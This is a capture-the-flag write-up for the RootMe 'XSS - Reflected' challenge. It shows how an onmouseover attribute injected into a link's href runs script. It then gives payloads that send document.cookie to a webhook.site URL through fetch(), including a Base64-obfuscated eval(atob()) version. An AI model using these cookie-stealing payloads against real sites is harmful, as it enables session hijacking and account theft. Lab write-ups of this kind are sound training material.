---
layout: default
title: RootMe - XSS - Reflected
permalink: /web-client/xss-reflected
---

# XSS - Reflected

## Statement
Find a way to steal the administrator’s cookie.
Be careful, this administrator is aware of info security and he does not click on strange links that he could receive.

## Analyze
We have this website (*http://challenge01.root-me.org/web-client/ch26*) about VALHALLA INC.

Quickly we found the page `/?p=about` in **About** section.
![About page, VALHALLA INC.](/assets/img/rootme/xss-reflected-1.png "About page, VALHALLA INC.")


Let's test with `/?p=test` to see the result.
![?p=test page, VALHALLA INC.](/assets/img/rootme/xss-reflected-2.png "?p=test page, VALHALLA INC.")

`test` is displayed as hyperlink inside `<a>` tag, we can start testing XSS payloads.

- First attempt: `?p=<b>test</b>` : The payload is filetered with HTML Entity.
- Second attempt: `?p=' target='alert(1)` : We tinker with `<a>` but it gave nothing.
- Third attempt: `?p=' onmouseover='alert(1)` : After some research, the `onmouseover` attributes appear in global attributes (https://www.w3schools.com/tags/ref_eventattributes.asp), we test it and it work !

!["alert(1) with onmouseover in query"](/assets/img/rootme/xss-reflected-3.png "alert(1) with onmouseover in query")

## Exploitation
So, with `onmouseover` attributes, all we have left to do is to use `fetch()` on a webhook with `document.cookie` in URL query.

**Payload:**<br>
`?p=' onmouseover='fetch("https://webhook.site/6d5ede82-cc64-4a47-935a-c35dd94c368b?"%2Bdocument.cookie)`

This payload doesn't work when reporting to the administrator, this is because the statement says: "*Be careful, this administrator is aware of info security and <ins>he does not click on strange links that he could receive.</ins>*"

The `https://webhook.site/6d5ede82-cc64-4a47-935a-c35dd94c368b?"%2Bdocument.cookie` is too suspicious, we need to hide it to bypass filters.

To do that I use an `eval(atob())` with our `fetch(xxx)` encoded in Base64

**New payload:**<br>
`?p=' onmouseover='eval(atob("ZmV0Y2goImh0dHBzOi8vd2ViaG9vay5zaXRlLzZkNWVkZTgyLWNjNjQtNGE0Ny05MzVhLWMzNWRkOTRjMzY4Yj8iK2RvY3VtZW50LmNvb2tpZSk="))`

After waiting some minutes we obtain the flag:
`https://webhook.site/6d5ede82-cc64-4a47-935a-c35dd94c368b?flag=xxxxxxxxxxxxxxxxx`